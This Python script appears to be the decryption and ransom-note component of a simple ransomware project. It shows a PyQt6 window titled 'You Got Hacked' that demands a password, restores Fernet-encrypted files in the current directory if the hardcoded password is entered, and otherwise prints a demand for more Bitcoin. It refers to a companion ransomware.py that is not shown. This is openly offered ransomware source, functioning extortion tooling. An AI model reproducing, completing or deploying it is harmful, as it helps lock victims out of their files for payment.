#! /usr/bin/env python3

import os
from PyQt6.QtWidgets import *
from cryptography.fernet import Fernet

# Check if encrypted or not
if not os.path.exists(f"/home/encrypted.key"):
	exit("Decrypted ya 3beet")


# Python GUI using PyQt6

class GUI:

    app = QApplication([])

    window = QWidget()

    inp = QLineEdit(window)

    entered = ""

    def __init__(self):

        self.window.setStyleSheet("background-image : url('./src/hacker-4031973__480.png');")
        self.window.resize(690,470)
        self.window.move(330,130)
        self.window.setWindowTitle("You Got Hacked")

        label1 = QLabel("<h2>Enter the password to decrypt the files</h2>", self.window)
        label1.setStyleSheet("color: white; background-image: url('')");

        self.inp.setStyleSheet("background-image : url('')")
        self.inp.setFixedWidth(200)
        
        label2 = QLabel("<h3>Contact Info. <a href='http://example.com'>example.com</a></h3>", self.window)
        label2.setStyleSheet("color: red; background-image: url('');");
        label2.setOpenExternalLinks(True);

        btn = QPushButton('OK', self.window)
        btn.setStyleSheet("background-image: url('')")
        btn.clicked.connect(self.clicked)

        label1.move(140, 170)
        self.inp.move(250, 210)
        label2.move(0, 440)
        btn.move(320, 260)

        self.window.show()

        self.app.exec()

    def clicked(self):
        self.entered = self.inp.text()
        self.app.quit()

gui = GUI()

# End GUI

files = [] # Encrypted files

for file in os.listdir():

	if file == "ransomware.py" or file == "decrypt.py":
		continue

	if os.path.isfile(file):
		files.append(file)

password = "randompassword"

if gui.entered == password:


	with open(f"/home/thekey.key", "rb") as thekey:

		secretkey = thekey.read()

	for file in files:

		with open(file, "rb") as thefile:

			content = thefile.read()

		content_decrypted = Fernet(secretkey).decrypt(content)

		with open(file, "wb") as thefile:

			thefile.write(content_decrypted)

	print("Congrats, Your files have been decrypted <3")

	os.remove(f'/home/encrypted.key')

	os.remove(f'/home/thekey.key')

else:

	print("Wrong Password, Send me more Bitcoin :)")
